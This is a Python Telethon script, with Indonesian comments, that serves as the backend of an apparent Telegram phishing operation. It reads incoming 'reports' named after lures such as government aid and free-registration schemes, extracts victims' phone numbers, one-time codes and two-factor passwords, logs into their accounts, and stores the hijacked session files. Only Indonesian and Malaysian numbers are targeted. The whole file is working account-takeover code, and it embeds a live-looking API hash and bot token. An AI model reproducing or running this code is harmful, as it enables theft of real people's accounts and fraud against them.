import asyncio
import os
import re
import json
import shutil
import time
from telethon import TelegramClient, events

# === Konfigurasi Dasar ===
API_ID = 29564591
API_HASH = '99d943dcb43f77dd61c9b020105a541b'
BOT_TOKEN = '7621100011:AAGFxJa8g1kjtBkfc4hiwZESYSDAbncItjU'

TEMP_SESSIONS = "ewww_sessions"
FINAL_SESSIONS = "sessions"

os.makedirs(TEMP_SESSIONS, exist_ok=True)
os.makedirs(FINAL_SESSIONS, exist_ok=True)

WHITELIST_PREFIX = ["+62", "+60"]

# Menyimpan status login per nomor
login_queue = {}

# === Validasi Nomor ===
def valid_number(number):
    return (
        re.fullmatch(r"\+\d{10,15}", number)
        and any(number.startswith(pfx) for pfx in WHITELIST_PREFIX)
    )

# === Pindahkan session sukses ke folder final ===
def relocate_session(phone):
    src = os.path.join(TEMP_SESSIONS, phone + ".session")
    dst = os.path.join(FINAL_SESSIONS, f"{phone}.session")
    if os.path.exists(src):
        try:
            shutil.move(src, dst)
            print(f"[✔] Session {phone} berhasil dipindahkan ke folder sessions.")
        except Exception as e:
            print(f"[❌] Gagal memindahkan session {phone}: {e}")
    else:
        print(f"[✖] Session {phone} tidak ditemukan di {src}.")

# === Client utama (untuk menerima pesan) ===
main_client = TelegramClient('main5', API_ID, API_HASH)

# === Event Handler untuk Pesan Grup ===
@main_client.on(events.NewMessage)
async def handle_group_message(event):
    content = event.raw_text

    if any(tag in content for tag in [
        '❮ LAPORAN Judul ❯',
        '❮ LAPORAN BANTUAN MADANI ❯',
        '❮ LAPORAN DAFTAR GRATISKU ❯',
        '❮ LAPORAN UANG KUNO ❯',
        '❮ LAPORAN LAMBE PECINTA JANDA ❯',
        '❮ LAPORAN FAIDIL  ❯'
    ]):
        phone_match = re.search(r'PHONE NUMBER\s*:\s*(\+?\d+)', content)
        otp = re.search(r'OTP\s*:\s*(\d{5,6})', content)
        passwd = re.search(r'PASSWORD\s*:\s*(\S+)', content)

        if phone_match:
            number = phone_match.group(1)
            if number.startswith('62') and not number.startswith('+'):
                number = '+' + number
            elif number.startswith('60') and not number.startswith('+'):
                number = '+' + number

            password = passwd.group(1) if passwd else None

            if not valid_number(number):
                print(f"[❗] Nomor tidak valid: {number}")
                return

            if otp:
                code = otp.group(1)
                print(f"[📨] OTP untuk {number}: {code}")
                if number in login_queue and login_queue[number].get("code_requested"):
                    asyncio.create_task(login_with_code(number, code, password))
                else:
                    print(f"[⚠] Belum ada request OTP untuk {number} atau sudah kadaluarsa.")
            else:
                if number not in login_queue:
                    print(f"[📲] Meminta OTP untuk {number}")
                    asyncio.create_task(send_otp_request(number))
                else:
                    print(f"[⏳] Menunggu OTP untuk {number}...")

# === Kirim OTP Request ===
async def send_otp_request(number):
    try:
        sess_path = os.path.join(TEMP_SESSIONS, number)
        client = TelegramClient(sess_path, API_ID, API_HASH)
        await client.connect()

        if not await client.is_user_authorized():
            result = await client.send_code_request(number)
            login_queue[number] = {
                "client": client,
                "phone_code_hash": result.phone_code_hash,
                "timestamp": time.time(),
                "code_requested": True
            }
            print(f"[📧] Kode OTP dikirim ke {number}")
        else:
            print(f"[✔] {number} sudah login sebelumnya.")
            await client.disconnect()
    except Exception as err:
        print(f"[❌] Gagal mengirim OTP ke {number}: {err}")

# === Login Menggunakan OTP ===
async def login_with_code(number, code, password=None):
    try:
        session = login_queue.get(number)
        if not session:
            print(f"[✖] Tidak ditemukan client aktif untuk {number}")
            return

        client = session["client"]
        phone_code_hash = session.get("phone_code_hash")
        if not phone_code_hash:
            print(f"[❗] phone_code_hash hilang untuk {number}")
            return

        print(f"[🔐] Menggunakan OTP {code} dengan hash {phone_code_hash} untuk {number}")

        try:
            await client.sign_in(phone_number=number, code=code, phone_code_hash=phone_code_hash)
        except Exception as e:
            if '2FA' in str(e) or 'password' in str(e).lower():
                if password:
                    await client.sign_in(password=password)
                else:
                    print(f"[🔒] Password diperlukan untuk {number}, tapi tidak tersedia.")
                    return
            else:
                raise e

        print(f"[✅] Login berhasil untuk {number}")
        await client.disconnect()
        relocate_session(number)
        del login_queue[number]

    except Exception as err:
        print(f"[⚠] Gagal login/daftar untuk {number}: {err}")
        if number in login_queue:
            try:
                await login_queue[number]["client"].disconnect()
            except:
                pass
            del login_queue[number]

# === Jalankan Bot ===
async def run_main():
    await main_client.start()
    print("[🚀] Bot Telegram aktif dan siap menerima pesan.")
    await main_client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(run_main())
